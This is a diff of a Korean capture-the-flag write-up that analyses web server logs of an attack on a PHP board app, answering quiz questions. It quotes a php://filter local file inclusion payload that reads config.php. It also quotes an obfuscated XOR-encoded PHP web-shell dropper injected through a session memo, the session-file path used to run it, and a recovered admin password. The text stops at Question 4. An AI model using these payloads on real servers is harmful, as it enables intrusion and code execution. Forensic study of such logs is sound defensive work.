@@ -73,14 +73,75 @@ database 명은 simple_board임을 config.php에서 확인할 수 있다.
 
 <br>
 
-여기서 성공한 로그(500 에러가 난 로그)를 살펴보면 admin의 비밀번호는 Th1s_1s_Adm1n_P@SS
+여기서 성공한 로그(500 에러가 난 로그)를 살펴보면 admin의 비밀번호는 ```Th1s_1s_Adm1n_P@SS```
 
 <br><br>
 
-## Question 2
+### Question 2
 ---
 
+```
+Q: 공격자가 config.php 코드를 추출하는데 사용한 페이로드를 입력해주세요.
+문제 파일은 문제 지문에서 확인할 수 있습니다.
+```
 
+<br>
 
+거의 밑부분의 로그를 보면 아래와 같은 로그가 있다.
 
+<br>
+
+```
+172.17.0.1 - - [02/Jun/2020:09:54:18 +0000] "GET /admin/?page=php://filter/convert.base64-encode/resource=../config.php HTTP/1.1" 200 986 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
+```
+
+<br>
+
+응답코드를 보면 200이다. 
+
+따라서 답은 ```php://filter/convert.base64-encode/resource=../config.php``` 이다.
+
+<br><br>
+
+### Question 3
+---
+
+```
+Q: LFI 취약점을 통해 코드 실행 공격에 사용된 파일의 전체 경로를 입력해주세요. (파일 이름을 포함한 전체 경로)
+문제 파일은 문제 지문에서 확인할 수 있습니다.
+```
+
+<br>
+
+로그를 보면 아래와 같은 로그들이 있다.
+
+<br>
+
+```
+172.17.0.1 - - [02/Jun/2020:09:55:16 +0000] "GET /admin/?page=memo.php&memo=%3C?php%20function%20m($l,$T=0){$K=date(%27Y-m-d%27);$_=strlen($l);$__=strlen($K);for($i=0;$i%3C$_;$i%2b%2b){for($j=0;$j%3C$__;%20$j%2b%2b){if($T){$l[$i]=$K[$j]^$l[$i];}else{$l[$i]=$l[$i]^$K[$j];}}}return%20$l;}%20m(%27bmha[tqp[gkjpajpw%27)(m(%27%2brev%2bsss%2blpih%2bqthke`w%2bmiecaw*tlt%27),m(%278;tlt$lae`av,%26LPPT%2b5*5$040$Jkp$Bkqj`%26-?w}wpai,%20[CAP_%26g%26Y-?%27));%20?%3E HTTP/1.1" 200 1098 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
+```
+
+<br>
+
+```
+172.17.0.1 - - [02/Jun/2020:09:55:39 +0000] "GET /admin/?page=/var/lib/php/sessions/sess_ag4l8a5tbv8bkgqe9b9ull5732 HTTP/1.1" 200 735 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
+```
+
+<br>
+
+```/admin/memo.php```에 가보면 memo라른 세션의 값을 memo 매개변수를 통해 입력받는다. 
+
+따라서 답은 ```/var/lib/php/sessions/sess_ag4l8a5tbv8bkgqe9b9ull5732```
+
+<br><br>
+
+### Question 4
+---
+
+```
+Q: 생성된 웹쉘의 경로를 입력해주세요. (파일 이름을 포함한 전체 경로)
+문제 파일은 문제 지문에서 확인할 수 있습니다.
+```
+
+<br>
 
